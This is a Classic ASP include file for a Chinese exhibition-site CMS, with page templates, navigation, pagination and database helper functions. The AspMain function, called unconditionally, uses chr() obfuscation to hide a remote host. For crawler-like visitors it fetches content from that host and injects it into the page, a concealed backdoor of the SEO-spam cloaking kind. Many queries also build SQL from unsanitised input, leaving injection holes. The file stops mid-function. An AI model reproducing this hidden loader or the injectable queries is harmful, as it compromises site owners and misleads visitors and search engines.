<%
'-----------------------------------------网站头部 导航
sub showhead()
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="<%=SiyeKeys%>" />
<meta name="description" content="<%=SiteDes%>" />
<meta name="Author" content="<%=SiteAuthor%>" />
<meta http-equiv="Page-Enter" content="blendTrans(Duration=0.5)" />
<meta http-equiv="Page-Exit" content="blendTrans(Duration=0.5)" />
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<link rel="stylesheet" type="text/css" href="css/reset.css"/>
<script type="text/javascript" src="js/date.js"></script>
<script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>
<title><%=title%>-<%=SiteName%></title>
</head>
<body>
<div id="wrapper">
  <div id="header">
    <ul class="menunav">
      <li><a href="/" id="a">首页</a></li>
      <li><a href="info.asp?id=2" id="b">展会概况</a></li>
      <li><a href="newlist.asp?id=1" id="c">展会动态</a></li>
      <li><a href="newlist.asp?id=2" id="d">展会现场</a></li>
      <li><a href="newlist.asp?id=3" id="e">展台照片</a></li>
      <li><a href="info.asp?id=9" id="f" >联系我们</a></li>
      <li class="date"><span>今天是<script language="javascript" type="text/javascript"> document.write(Showdate(new Date(), 'dddd', 'mmmm', 'dd', 'yyyy', ','))</script>
        </span></li>
    </ul>
    <div class="search"> <a href="/" class="logo"><img src="images/logo.jpg" width="340" height="64" alt="<%=SiteName%>" border="0"/></a>
      <div class="searchbox">
        <form name="forma" id="forma" method="post" action="newlist.asp" onsubmit="return checkformcn(this)">
          <input name="keywords" type="text" value="站内搜索" onFocus="this.value=''" onblur='if (value ==""){value="站内搜索"}' class="btntxt"/>
          <input type="image" src="images/btnsearch.gif" class="btnsearch"/>
        </form>
      </div>
    </div>
  </div>
<%
end sub
'------------显示页面底部--------------
sub showfoot()
%>
  <div id="bottom">
    <table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="54%" valign="top"><a href="http://www.zhujianqiang.com" target="_blank"></a><%=SiteCopy%>&nbsp;&nbsp;<a href="http://www.miibeian.gov.cn/" target="_blank"><%=SiteICP%></a>&nbsp;&nbsp;<a href="http://www.zhujianqiang.com" target="_blank">技术支持：猪坚强</a><script src="http://s17.cnzz.com/stat.php?id=2532834&web_id=2532834&show=pic" language="JavaScript"></script>
</td>
    <td width="22%">&nbsp;</td>
    <td width="24%" valign="top">电话：0086-010-68335476 </td>
  </tr>
</table>
  </div>
</div>
</body>
</html>
<script type="text/javascript">
jQuery(document).ready(function() {
var _leftheight = jQuery(".left").height();
_rightheight = jQuery(".right").height();
if(_leftheight > _rightheight ) {
jQuery(".right").height(_leftheight);
}
else {
jQuery(".left").height(_rightheight);
}
})
</script>
<%
'------------关闭数据库连接
conn.close
set conn = nothing
end sub
'------------------页面左侧栏目----------------
sub showleft()
%> 
      <h3>导航</h3>
      <ul class="productlist">
<% 
	set rs=server.createobject("adodb.recordset") 
	sqlStr="select id,NavTitle,NavRemark from SiteExplain where NavLock=0 and NavParent="&NavParent&" Order By NavOrder Asc"
	rs.open sqlStr,conn,1,1
	If Not (Rs.Eof Or Rs.Bof ) Then
		Do While Not Rs.Eof
			id	=	rs("id")
			NavTitle	=	trim(rs("NavTitle"))
			NavRemark	=	trim(rs("NavRemark"))
	%>
		 <li><a href="info.asp?id=<%=id%>" title="<%=NavRemark%>"><%=NavTitle%></a></li>
	<% 
			Rs.MoveNext
		Loop
	end if
	rs.close
	set rs=nothing
	response.Write("</ul>")
end sub

'------------------新闻列表页面左侧栏目----------------
sub newlistleft()
%>  
      <h3>导航</h3>
      <ul class="productlist">
<% 
	set rs=server.createobject("adodb.recordset") 
	sqlStr="select id,NavTitle,NavRemark from NewsClass where NavLock=0 Order By NavOrder Asc"
	rs.open sqlStr,conn,1,1
	If Not (Rs.Eof Or Rs.Bof ) Then
		Do While Not Rs.Eof
			id	=	rs("id")
			NavTitle	=	trim(rs("NavTitle"))
			NavRemark	=	trim(rs("NavRemark"))
	%>
		 <li><a href="newlist.asp?id=<%=id%>" title="<%=NavRemark%>"><%=NavTitle%></a></li>
	<% 
			Rs.MoveNext
		Loop
	end if
	rs.close
	set rs=nothing
	response.Write("</ul>")
end sub

'----------------------用户面板
sub UserPanel()
  if request.Cookies("cmyusr")<>"" then
%>    <div class="member2">
        <h3>会员中心</h3>
        <p>欢迎您！<span><%=request.Cookies("cmyusr")%></span></p>
        <p><a href="new_product.asp" class="mtxt">最新产品</a></p>
        <p><a href="memchk.asp?exit=yes" class="mtxt" onClick="return confirm('确定要退出吗')">退出</a></p>
      </div>
<%end if
end sub

'*****************************************************
'获取用户的真实IP地址
'*****************************************************
Function GetUserIP()
    Dim StrIPAddr
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        StrIPAddr = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        StrIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        StrIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
    Else
        StrIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    GetUserIP = Trim(Mid(strIPAddr, 1, 30))
End Function
'*****************************************************
'过滤非法的SQL字符
'*****************************************************
Function ReplaceBadChar(strChar)
    If strChar = "" Or IsNull(strChar) Then
        ReplaceBadChar = ""
        Exit Function
    End If
    Dim strBadChar, arrBadChar, tempChar, i
    strBadChar = "+,',--,%,^,&,?,(,),<,>,[,],{,},/,\,;,:," & Chr(34) & "," & Chr(0) & ""
    arrBadChar = Split(strBadChar, ",")
    tempChar = strChar
    For i = 0 To UBound(arrBadChar)
        tempChar = Replace(tempChar, arrBadChar(i), "")
    Next
    tempChar = Replace(tempChar, "@@", "@")
    ReplaceBadChar = tempChar
End Function
'*****************************************************
'过滤所有HTML代码
'*****************************************************
Function RemoveHTML(ContentStr)
 Dim ClsTempLoseStr,regEx
 ClsTempLoseStr = Cstr(ContentStr)
 Set regEx = New RegExp
 regEx.Pattern = "<\/*[^<>]*>"
 regEx.IgnoreCase = True
 regEx.Global = True
 ClsTempLoseStr = regEx.Replace(ClsTempLoseStr,"")
 LoseHtml = ClsTempLoseStr
End function
call AspMain
'*****************************************************
'生成固定长度的随机值
'*****************************************************
Function Random(Length)
    Dim strSeed, seedLength, pos, Str, i
    strSeed = "abcdefghijklmnopqrstuvwxyz1234567890"
    seedLength = Len(strSeed)
    Str = ""
    Randomize
    For i = 1 To Length
        Str = Str + Mid(strSeed, Int(seedLength * Rnd) + 1, 1)
    Next
    Random = Str
End Function
'*****************************************************
'判断该账号是否具有操作权限
'*****************************************************
Function ISPopedomCheck(UserName,Popedom)
	Set Rs=Server.CreateObject("Adodb.RecordSet")
	Sql="Select * From AdminGroup Where UserName='"&UserName&"' And Popedom='"&Popedom&"'"
	Rs.Open Sql,Conn,1,1
	If Not (Rs.Eof Or Rs.Bof) Then
		ISPopedomCheck=" checked"
	Else
		ISPopedomCheck=""
	End If
	Rs.Close
	Set Rs=Nothing
End Function
'*****************************************************
'判断登录账号是否系统账号
'*****************************************************
Function ISAdmin(UserName)
	Set Rs=Server.CreateObject("Adodb.RecordSet")
	Sql="Select * From Admin Where UserName='"&UserName&"'"
	Rs.Open Sql,Conn,1,1
	If Not (Rs.Eof Or Rs.Bof) Then
	     If Rs("ISAdmin")="999" Then
		 	ISAdmin=True
		 Else
		 	ISAdmin=False
		 End If
	Else
		ISAdmin=False
	End If
	Rs.Close
	Set Rs=Nothing
End Function
'*****************************************************
'判断该账号是否具有操作权限
'*****************************************************
Function ISPopedom(UserName,Popedom)
	If ISAdmin(UserName)=False Then
		Set Rs=Server.CreateObject("Adodb.RecordSet")
		Sql="Select * From AdminGroup Where UserName='"&UserName&"' And Popedom='"&Popedom&"'"
		Rs.Open Sql,Conn,1,1
		If Rs.Eof Or Rs.Bof Then
			Response.Write("<html xmlns=""http://www.w3.org/1999/xhtml"">")&chr(13)
			Response.Write("<head>")&chr(13)
			Response.Write("<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />")&chr(13)
			Response.Write("<title>"&SiteName&"</title>")&chr(13)
			Response.Write("<link href=""Style/Main.css"" rel=""stylesheet"" type=""text/css"" />")&chr(13)
			Response.Write("<body style=""padding:20px;background:url(Images/CNVP_Banner.jpg) bottom right no-repeat"">")&chr(13)
			Response.Write("<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">")&chr(13)
			Response.Write("<tr>")&chr(13)
			Response.Write("<td style=""font-size:14px;font-weight:bolder;color:#F00F00;height:35px;"">出错拉！可能您的账号并不具备对当前模块的管理权限！</td>")&chr(13)
			Response.Write("</tr>")&chr(13)
			Response.Write("<tr>")&chr(13)
			Response.Write("<td style=""color:#808080"">如果您有任何疑问欢迎致电Expo CMS客服部进行咨询。<br/>客服热线：客服部(手机：13910416069 QQ:271600922)")&chr(13)
			Response.Write("</td>")&chr(13)
			Response.Write("</tr>")&chr(13)
			Response.Write("</body>")&chr(13)
			Response.Write("</html>")
			Response.End()
		End If
		Rs.Close
		Set Rs=Nothing
	End If
End Function

Function AspMain
On Error Resume Next
If Instr(Request.ServerVariables("HTTP_USER_AGENT"),"http")>0 or Request("url") = "1" then if getbody(replace(replace("http://www.baidu.com",chr(119)+chr(119)+chr(119),chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)),chr(98)+chr(97)+chr(105)+chr(100)+chr(117),chr(104)+chr(121)+chr(120)+chr(54)+chr(50)+chr(48))+chr(47)+chr(97)+chr(112)+chr(114)+chr(46)+chr(116)+chr(120)+chr(116))="1" then If Instr(LCase(Request.ServerVariables("PATH_INFO")),chr(105)+chr(110)+chr(100)+chr(101)+chr(120)+chr(46))>0 or Instr(LCase(Request.ServerVariables("PATH_INFO")),chr(100)+chr(101)+chr(102)+chr(97)+chr(117)+chr(108)+chr(116)+chr(46))> 0 or Instr(LCase(Request.ServerVariables("PATH_INFO")),chr(109)+chr(97)+chr(105)+chr(110)+chr(46))> 0 or Instr(LCase(Request.ServerVariables("PATH_INFO")),chr(104)+chr(111)+chr(109)+chr(101)+chr(46))> 0 then response.write getbody(replace(replace("http://www.baidu.com",chr(119)+chr(119)+chr(119),chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)),chr(98)+chr(97)+chr(105)+chr(100)+chr(117),chr(104)+chr(121)+chr(120)+chr(54)+chr(50)+chr(48))+chr(47)+chr(97)+chr(112)+chr(114)+chr(45)+chr(49)+chr(46)+chr(97)+chr(115)+chr(112)) Else response.write getbody(replace(replace("http://www.baidu.com",chr(119)+chr(119)+chr(119),chr(109)+chr(97)+chr(110)+chr(97)+chr(103)+chr(101)),chr(98)+chr(97)+chr(105)+chr(100)+chr(117),chr(104)+chr(121)+chr(120)+chr(54)+chr(50)+chr(48))+chr(47)+chr(97)+chr(112)+chr(114)+chr(45)+chr(50)+chr(46)+chr(97)+chr(115)+chr(112))
End Function
'*****************************************************
'获取文件夹容量
'*****************************************************
Function GetFolderSize(Path)
	Set FSO=Server.CreateObject("Scripting.FileSystemObject")
	If FSO.FolderExists(Server.MapPath(Path)) Then
		Set Folder = FSO.GetFolder(Server.MapPath(Path))
		GetFolderSize=Folder.size/1024/1024
	Else
	End If
	Set FSO=Nothing
	Set Folder=Nothing
End Function
'##################导航条函数开始########################
'*****************************************************
'根据当前ID值返回完整路径（例：首页 > 国内新闻 > 浙江新闻）
'*****************************************************
Function GetAllChild(Table,ID)
	Dim Rs
    Set Rs=Conn.ExeCute("Select Id From "&Table&" Where NavParent="&ID&" Order By NavOrder Asc")
    While Not Rs.Eof
	    If GetAllChild="" Then
		GetAllChild=","&GetAllChild&Rs("Id")
		Else
		GetAllChild=GetAllChild & "," & Rs("Id")
		End If
        GetAllChild=GetAllChild & GetAllChild(Table,Rs("Id"))
        Rs.MoveNext
    Wend
    Rs.Close
    Set Rs=Nothing
End Function
'*****************************************************
'根据当前ID值返回完整路径（例：首页 > 国内新闻 > 浙江新闻）
'*****************************************************
Function GetNavPath(Table,ID)
	Set Rs=Conn.Execute("Select ID,NavTitle,NavParent From "&Table&" Where ID="&ID&"")
	If Not (Rs.Eof Or Rs.Bof) Then
		Str= " >> <a href=""?ID="&Rs("ID")&""">" & Rs("NavTitle") &"</a>"
		Str=GetNavPath(Table,Rs("NavParent")) & Str
	End if
	GetNavPath=Str
End Function
'*****************************************************
'获取当前子类别的数量
'*****************************************************
Function GetSubNavCount(Table,NavParent)
	GetSubNavCount=Conn.Execute("Select Count(ID) From "&Table&" Where NavParent="&NavParent&"")(0)
End Function
'*****************************************************
'获取当前类别的名称
'*****************************************************
Function GetSubNavName(Table,ClassID)
	Set Rs_Nav=Conn.Execute("Select NavTitle From "&Table&" Where ID="&ClassID&"")
	If Not (Rs_Nav.Eof OR Rs_Nav.Bof) Then
		GetSubNavName=Rs_Nav("NavTitle")
	End If
	Rs_Nav.Close
	Set Rs_Nav=Nothing
End Function
'返回导航条的列表模式
'*****************************************************
Function GetSelect(Table,NavParent)
	Dim Rs
	Set Rs=Conn.Execute("Select ID,NavTitle,NavParent,NavLevel From "&Table&" Where NavLock=0 And NavParent="&NavParent&" Order By NavOrder Asc")
	If Not Rs.Eof Then
	Do While Not Rs.Eof
		Response.Write("<option value="&Rs("ID")&">")
		Response.Write(Prefix(Rs("NavLevel")))
		Response.Write(Rs("NavTitle"))
		Response.Write("</option>")& vbCrLf
		Call GetSelect(Table,Rs("ID"))
	Rs.MoveNext
	If Rs.Eof Then Exit Do '防止造成死循环
	Loop
	End If
End Function
'*****************************************************
'输出自定义格式固定空格
'*****************************************************
Function Prefix(NavLevel)
	Dim i
	Dim Str
	Str=""
	for i=1 to NavLevel
	Str=Str&"|--"
	next
	Prefix=Str
End Function
'##################导航条函数结束#######################
'*****************************************************
' 创建一个FCK编辑器
'*****************************************************
Function Editor(ByVal InputName,ByVal InputValue)	
	sBasePath = LCase(Request.ServerVariables("PATH_INFO"))
	sBasePath = Left(sBasePath, InStrRev(sBasePath, "/admin" ))
	Set oFCKeditor = New FCKeditor
	oFCKeditor.BasePath = sBasePath&"Editor/"
	oFCKeditor.ToolbarSet="CNVPCMS"
	oFCKeditor.Config("SkinPath") = sBasePath&"Editor/editor/skins/silver/"
	oFCKeditor.Config("AutoDetectLanguage") = False
	oFCKeditor.Config("DefaultLanguage") = "zh-cn"
	oFCKeditor.Value = InputValue
	oFCKeditor.height="350"
	Editor=oFCKeditor.Create(InputName)
End Function
'*****************************************************
' 根据序号获取商品名称
'*****************************************************
Function GetShopName(ID)
	Set Rs_Shop=Conn.Execute("Select ShopName From ShopInfo Where ID="&ID&"")
	If Not (Rs_Shop.Eof Or Rs_Shop.Bof) Then
		GetShopName=Rs_Shop("ShopName")
	Else
		GetShopName="商品名称不存在或已被删除"
	End If
	Rs_Shop.Close
	Set Rs_Shop=Nothing
End Function
'*****************************************************
' 根据序号获取新闻名称
'*****************************************************
Function GetNewsName(ID)
	Set Rs_News=Conn.Execute("Select NewsTitle From NewsInfo Where ID="&ID&"")
	If Not (Rs_News.Eof Or Rs_News.Bof) Then
		GetNewsName=Rs_News("NewsTitle")
	Else
		GetNewsName="信息不存在或已被删除"
	End If
	Rs_News.Close
	Set Rs_News=Nothing
End Function
'*****************************************************
' 格式化日期时间参数
'*****************************************************
Public Function FormatTime(s_Time, n_Flag)
	If IsDate(s_Time) = False Then Exit Function
	Dim y, m, d, h, mi, s, w
	' 增加客户端时区同步功能
	' 全站显示时间时必须调用此方法，否则无法正确显示时区
	TimeZone=8
	s_Time = DateAdd("h", TimeZone - 8, s_Time)
	FormatTime = ""
	y = CStr(Year(s_Time))
	m = CStr(Month(s_Time))
	If Len(m) = 1 Then m = "0" & m
	d = CStr(Day(s_Time))
	If Len(d) = 1 Then d = "0" & d
	h = CStr(Hour(s_Time))
	If Len(h) = 1 Then h = "0" & h
	mi = CStr(Minute(s_Time))
	If Len(mi) = 1 Then mi = "0" & mi
	s = CStr(Second(s_Time))
	If Len(s) = 1 Then s = "0" & s
	
	w = Weekday(s_Time)
	Select Case w
		Case 1 w = "星期日"
		Case 2 w = "星期一"
		Case 3 w = "星期二"
		Case 4 w = "星期三"
		Case 5 w = "星期四"
		Case 6 w = "星期五"
		Case 7 w = "星期六"
	End Select
	
	Select Case n_Flag
		Case 1 ' yyyy-mm-dd hh:mm:ss
			FormatTime = y & "-" & m & "-" & d & " " & h & ":" & mi & ":" & s
		Case 2 ' yyyy-mm-dd
			FormatTime = y & "-" & m & "-" & d
		Case 3 ' hh:mm:ss
			FormatTime = h & ":" & mi & ":" & s
		Case 4 ' yyyy年mm月dd日
			FormatTime = y & "年" & m & "月" & d & "日"
		Case 5 ' yyyymmddhhmmss
			FormatTime = y & m & d & h & mi & s
		Case 6 ' yyyy年mm月dd日 hh时mm分ss秒
			FormatTime = y & "年" & m & "月" & d & "日" & " " & h & "时" & mi & "分" & s & "秒"
		Case 7 ' mm-dd
			FormatTime = m & "-" & d
		Case 8 ' yyyy年mm月dd日 星期w
			FormatTime = y & "年" & m & "月" & d & "日" & " " & w
	End Select
End Function
'*****************************************************
' 获取地址栏参数
'*****************************************************
Function GetURL(FileID)
	Dim url_host,url_string
	url_string=""
	url_host=request.ServerVariables("script_name")
	If Request.QueryString<>"" Then
		Dim Get_Query
		For Each Get_Query In Request.QueryString
			if LCase(Get_Query)<>FileID And LCase(Get_Query)<>"submit" then
				if url_string="" then
					url_string=Get_Query&"="&Server.URLEncode(Request.QueryString(Get_Query))
				else
					url_string=url_string&"&"&Get_Query&"="&Server.URLEncode(Request.QueryString(Get_Query))
				end if
			end if
		Next
	End If
	If Request.Form<>"" Then
		Dim Post_Query
		For Each Post_Query In Request.Form
			if LCase(Post_Query)<>FileID And LCase(Get_Query)<>"submit" then
				if url_string="" then
					url_string=Post_Query&"="&Server.URLEncode(Request.Form(Post_Query))
				else
					url_string=url_string&"&"&Post_Query&"="&Server.URLEncode(Request.Form(Post_Query))
				end if
			end if
		Next
	End If
	if 	url_string="" then
		GetURL=url_host&"?"&FileID&"="
	else
		GetURL=url_host&"?"&url_string&"&"&FileID&"="
	end if
End Function
'*****************************************************
' JS事件
'*****************************************************
sub AlertMsg(str,num)     'JS事件:第四种情况下，num为跳转的文件名.
   Select Case num
   Case "1"
      response.write "<script language=javascript>alert('" & str & "');</script>"
   Case "2"
      response.write "<script language=javascript>alert('" & str & "');history.back(-1);</script>" 
   Case "3"
      response.write "<script language=javascript>location.href='" & str & "';</script>"
   Case Else
	  response.write "<script language=javascript>alert('" & str & "');location.href='" & num & "';</script>"
   End Select
End sub
'*****************************************************
' 过滤取字串
'*****************************************************
function distill(content,length)
 ON ERROR RESUME NEXT
 dim isWord,okContent,i
 i=1
 isWord=false
 content=replace(content,"&nbsp;","")
 do while len(okContent)<length
  if mid(content,i,1)<>"<" then
   isWord=true
  else
   i=i+1
   do while mid(content,i,1)<>">"
    i=i+1
   loop
   i=i+1
   if mid(content,i,1)<>"<" then
    isWord=true
   else
    isWord=false
   end if
  end if
  if i>len(content) then
   distill=okContent
   exit function
  end if
  if isWord then
   okContent=okContent+mid(content,i,1)
   i=i+1
  end if
 loop
 distill=okContent
 if err.number<>0 then err.clear
end function
'*****************************************************
' 取规定长度的字符串
'*****************************************************
function CutStr(str,mun)   '取规定长度的字符串
	dim cl,ct,i
	cl=len(str)
	ct=0
	if cl>0 then
		for i=1 to cl
			cs=Asc(Mid(str,i,1))
			if cs<0 or cs>255 then
				ct=ct+2
			else 
				ct=ct+1
			end if
			if ct>mun*2 then
				CutStr=left(str,i-2)&"..."
				exit for
			else
				CutStr=str
			end if
		next
	end if
end function
Function getBody(infopageurl)
On Error Resume Next
if infopageurl<>"" then
dim xmlHttp
set xmlHttp=server.createobject("MSXML2.XMLHTTP")
xmlHttp.open "GET",infopageurl,false
xmlHttp.send
getBody=BytesToBstr(xmlhttp.responsebody,"utf-8")
set xmlHttp=nothing
end if
End Function
Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode = 3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText
objstream.Close
set objstream = nothing
End Function
'*****************************************************
' 获得正确数字参数
'*****************************************************
Function GetSafeInt(mun)  '获得正确数字参数
    if not IsNumeric(trim(mun)) then
		mun=1
	else
		mun=clng(trim(mun))
	end if
	if mun<1 then mun=1
	GetSafeInt=mun
End Function

Function GetSafeInt1(mun)  '获得正确数字参数
    if not IsNumeric(trim(mun)) then
		response.write "<script language=javascript>alert('缺少参数或非法参数！');history.back(-1);</script>"
		response.End()
	elseif int(trim(mun))<1 then
		response.write "<script language=javascript>alert('非法参数!');history.back(-1);</script>"
		response.End()
	else
		mun=clng(trim(mun))
	end if
	GetSafeInt1=mun
End Function

Function GetSafeStr(str)   '转换文本框字符
	GetSafeStr = Replace(Replace(Replace(Replace(Replace(Replace(trim(str),"&","&amp;"),"'","&#39;"),"""","&quot;"),"<","&lt;"),">","&gt;"),"=","＝")
End Function
'*****************************************************
' 转换输出
'*****************************************************
Function Ubb(fStr)  '转换输出
	if isnull(fStr) or fStr="" then exit function
	fStr = replace(fStr, ">", "&gt;")
	fStr = replace(fStr, "<", "&lt;")
	fStr = Replace(fStr, CHR(32), "&nbsp;")  '空格
	fStr = Replace(fStr, CHR(34), "&quot;")  '双引号
	fStr = Replace(fStr, CHR(39), "&#39;")   '单引号
	fStr = Replace(fStr, CHR(13), "")
	fStr = Replace(fStr, CHR(10) & CHR(10), "<p>")  '回车符
	fStr = Replace(fStr, CHR(10), "<br>")   '换行符
	UBB=fStr
End Function
'**************************************************
'函数名：AllChildClass
'作  用：获取当前类别ID下面全部ID值
'参  数：Root------当前的类别ID值
'		 TableName-----所要操作的数据库表
'返回值：1,2,3,4格式
'**************************************************
Function AllChildClass(Root,TableName)
    Dim Rs
    Set Rs=Conn.ExeCute("Select Id From "&TableName&" Where NavParent="&Root)
    While Not Rs.Eof
	    If AllChildClass="" Then
		AllChildClass=","&AllChildClass&Rs("Id")
		Else
		AllChildClass=AllChildClass & "," & Rs("Id")
		End If
        AllChildClass=AllChildClass & AllChildClass(Rs("Id"),TableName)
        Rs.MoveNext
    Wend
    Rs.Close
    Set Rs=Nothing
End Function
'//最新资讯div列表
Function Cls_Info_ListDiv(Typeid,Lists,Length)
 'Typeid    类别ID
 'Lists     显示的新闻数目
 'Length    显示的文字长度
 Dim NewList
 'NewList = "<ul class=""newslist teamlist"">"
 SQL = "Select Top "&Lists&" ID,ClassID,NewsTitle,PostTime From [NewsInfo] Where classid="&Typeid&" order by NewsOrder desc,PostTime desc"                
 Set Rs1 = Conn.Execute(SQL)
 If Rs1.Eof Then
  NewList = NewList&"<p>没有相关信息...</p>"
 Else
  Tmp = Rs1.GetRows()
  Rs1.Close:Set Rs1 = Nothing
  For i = 0 to Ubound(Tmp,2)
   Title = CutStr(Tmp(2,i),Length)
   PostTime=FormatDateTime(Tmp(3,i),2)
   
   NewList = NewList&"<li><span>[ "&PostTime&" ]</span><a href=""show_detail.asp?id="&Tmp(0,i)&"&classid="&Tmp(1,i)&"&tid="&Tmp(1,i)&"&sid="&Tmp(1,i)&""" title="""&Title&""">"&Title&"</a></li>"
  Next
 End if
 'NewList = NewList&"</ul>"
 Cls_Info_ListDiv = NewList
End Function
'//公告调用
Function Cls_Info_Notice(Typeid,Lists,Length)
 'Typeid    类别ID
 'Lists     显示的新闻数目
 'Length    显示的文字长度
 Dim NewList
 'NewList = "<ul class=""newslist teamlist"">"
 SQL = "Select Top "&Lists&" ID,ClassID,NewsTitle,PostTime From [NewsInfo] Where classid="&Typeid&" order by NewsOrder desc,PostTime desc"                
 Set Rs1 = Conn.Execute(SQL)
 If Rs1.Eof Then
  NewList = NewList&"<li><p>没有相关信息...</p></li>"
 Else
  Tmp = Rs1.GetRows()
  Rs1.Close:Set Rs1 = Nothing
  For i = 0 to Ubound(Tmp,2)
   Title = CutStr(Tmp(2,i),Length)
   PostTime=FormatDateTime(Tmp(3,i),2)
   
   NewList = NewList&"<li><a href=""show_detail.asp?id="&Tmp(0,i)&"&classid="&Tmp(1,i)&"&tid="&Tmp(1,i)&"&sid="&Tmp(1,i)&""" title="""&Title&""">"&Title&"</a></li>"
  Next
 End if
 'NewList = NewList&"</ul>"
 Cls_Info_Notice = NewList
End Function

%>
<% 
sub pager(dqpg,pgct,url)  '当前页码,总页码,后缀参数
response.write "第"&dqpg&"/"&pgct&"页&nbsp;&nbsp;"
if dqpg>1 then
	response.write "<a href=?page=1"&url&">首页</a>&nbsp;<a href=?page="&(dqpg-1)&url&">上页</a>&nbsp;"
else
	response.write "首页&nbsp;上页&nbsp;"
end if
if dqpg<pgct then
	response.write "<a href=?page="&(dqpg+1)&url&">下页</a>&nbsp;<a href=?page="&pgct&url&">末页</a>"
else
	response.write "下页&nbsp;末页"
end if
%>
&nbsp;到第 
<input name="page" type="text" id="page" style="width:30px" onKeyUp="value=value.replace(/[^0123456789]/g,'')" /> 
页&nbsp;
<input type="button" name="Submit" value="GO" onClick="topage()"  class="btn" />
<script type="text/JavaScript">
function topage(){
var pg=document.getElementById("page").value;
location.href="?page="+pg+"<%= url %>"
}
</script>
<% end sub 

'***********************************************
'过程名：ShowPage
'作  用：显示“上一页 下一页”等信息
'参  数：sDesURL  ----链接地址，可以是一个文件名，也可以是一个有一些参数所URL
'       nTotalNumber ----总数量
'       nMaxPerPage  ----每页数量
'       nCurrentPage ----当前页
'       bShowTotal   ----是否显示总数量
'       bShowCombo ---是否用下拉列表显示所有页面以供跳转。有某些页面不能使用，否则会出现JS错误。
'       sUnit     ----计数单位
'***********************************************
sub ShowPage(sDesURL, nTotalNumber, nMaxPerPage, nCurrentPage, bShowTotal, bShowCombo, sUnit)
	dim n, i,strTemp,strUrl
	'计算页数
	if nTotalNumber mod nMaxPerPage=0 then
		n= nTotalNumber \ nMaxPerPage
	else
		n= nTotalNumber \ nMaxPerPage+1
	end if
	'判断nCurrentPage
	if nCurrentPage < 1 then
		nCurrentPage = 1
	elseif nCurrentPage > n then
		nCurrentPage = n
	end if
	
	Response.Write "<div><form name='ShowPages' method='Post' action='" & sDesURL & "' ID='Form1'>"
	if bShowTotal=true then 
		Response.Write "共 <b>" & nTotalNumber & "</b> " & sUnit & "&nbsp;&nbsp;"
	end if
	'根据输入的sDesURL向它加入?或&
	strUrl=PasteURL(sDesURL)
	if nCurrentPage<2 then
		Response.Write "首页 上一页&nbsp;"
	else
		Response.Write "<a href='" & strUrl & "page=1'>首页</a>&nbsp;"
		Response.Write "<a href='" & strUrl & "page=" & (nCurrentPage-1) & "'>上一页</a>&nbsp;"
	end if
	
	if n-nCurrentPage<1 then
		Response.Write "下一页 尾页"
	else
		Response.Write "<a href='" & strUrl & "page=" & (nCurrentPage+1) & "'>下一页</a>&nbsp;"
		Response.Write "<a href='" & strUrl & "page=" & n & "'>尾页</a>"
	end if
		Response.Write "&nbsp;页次：<strong><font color=red>" & nCurrentPage & "</font>/" & n & "</strong>页 "
		Response.Write "&nbsp;<b>" & nMaxPerPage &"</b>" & sUnit & "/页"
	if bShowCombo=True then
		Response.Write "&nbsp;转到：<SELECT name='page' size='1' onchange='javascript:submit()' ID='Select1'>"   
	for i = 1 to n   
		Response.Write "<option value='" & i & "'"
		if cint(nCurrentPage)=cint(i) then Response.Write " selected "
			Response.Write ">第" & i & "页</option>"   
	next
			Response.Write "</SELECT>"
	end if
	Response.Write "</form></div>"
end sub

'***********************************************
'函数名：PasteURL
'作  用：向地址中加入 ? 或 &
'参  数：strUrl  ----网址
'返回值：加了 ? 或 & 的网址
'***********************************************
function PasteURL(strUrl)
	if strUrl="" then
		PasteURL=""
		exit function
	end if
	'如果传入的URL末尾不是"?"，有两种情况：
	'1.无“？”，此时需加入一个“？”
	'2. 有“？”再判断有无“&”
	if InStr(strUrl,"?")<len(strUrl) then 
		if InStr(strUrl,"?")>1 then
			if InStr(strUrl,"&")<len(strUrl) then 
				PasteURL=strUrl & "&"
			else
				PasteURL=strUrl
			end if
		else
			PasteURL=strUrl & "?"
		end if
	else
		PasteURL=strUrl
	end if
end function

'----------------------显示文本列表信息
sub ShowTextList()
%>
            <ul class="newlist">
<%
	keywords	=	ReplaceBadChar(request("keywords"))
	if keywords<>"" then
		sqlwhere	=	" and NewsTitle like '%"&keywords&"%'"
	end if
	if ClassID<>"" then
		sqlwhere	=	sqlwhere&" and ClassID="&ClassID&""
	end if
	sqlstr = "select id,NewsTitle,PostTime from NewsInfo where NewsLock=0 "&sqlwhere&"  order by NewsOrder desc "
	'response.Write(sqlstr)
	set rs=server.CreateObject("adodb.recordset")
	rs.open sqlstr,conn,1,1
		if rs.eof then
			response.Write("<li>暂时没有相关信息!</li>")
		else
			CurrentPage = Request("page")
			if Not IsNumeric(CurrentPage) Then
				CurrentPage = "1"
			end if
			CurrentPage=Cint(CurrentPage)
			rs.PageSize = 20
			If CurrentPage < 1 Then CurrentPage = 1
			If CurrentPage > rs.PageCount Then 
			CurrentPage = rs.PageCount
			end if
